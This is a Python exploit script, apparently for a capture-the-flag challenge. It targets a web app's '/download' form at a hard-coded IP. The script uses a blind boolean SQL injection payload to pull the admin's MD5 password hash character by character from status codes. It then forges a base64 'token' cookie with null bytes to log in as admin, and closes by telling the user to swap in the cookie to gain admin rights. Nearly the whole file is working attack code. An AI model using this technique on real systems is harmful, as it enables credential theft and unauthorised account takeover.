import requests
import string
import base64

charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + "=/"
md5Charset = "abcdef" + string.digits

target = "http://54.251.213.12"

cookies = {
    "token": "BASE64-REDACTED"
}

# https://stackoverflow.com/questions/20759981/python-trying-to-post-form-using-requests

# Sanity checking
# ' or (select substring(user, 1, 1) from users where user='admin')='a' #

def downloadSQLi():
    hash = ""
    hashLength = 32 # since md5 hash

    for i in range(len(hash), hashLength):
        for hex in md5Charset:
            print("Testing", hash + hex)
            files = {
                'hash': (None, f"' or (select substring(password, {i+1}, 1) from users where user='admin')='{hex}' #"),
                'tmpDir': (None, 'QzpcVGVtcFw='),
                'submit': (None, 'Submit')
            }

            r = requests.post(target + "/download", cookies=cookies, files=files, allow_redirects=False)

            # 500 for false condition, 302 for true condition. 
            # print(r.status_code)
            if r.status_code == 302:
                hash += hex
                print("Found! Uncompleted token:", hash)
                break

    print("Final token:", hash)
    return hash

def craftMaliciousToken(hash):
    user = b"admin"
    password = hash.encode()
    nullByte = b"\x00"
    splitter = b":\x00"

    maliciousToken = b""

    for char in user:
        maliciousToken += chr(char).encode() + nullByte

    maliciousToken += splitter

    for char in password:
        maliciousToken += chr(char).encode() + nullByte

    print("With nullbytes (Actual Token):", base64.b64encode(maliciousToken).decode())

    print("Without nullbytes (For Testing):", base64.b64encode(user + b":" + password).decode())

def attack():
    hash = downloadSQLi()
    craftMaliciousToken(hash)
    print("You may now replace/add a `token` cookie with the generated cookie value printed above, before refreshing your page.")
    print("After doing so, you should be admin.")

if __name__ == "__main__":
    attack()
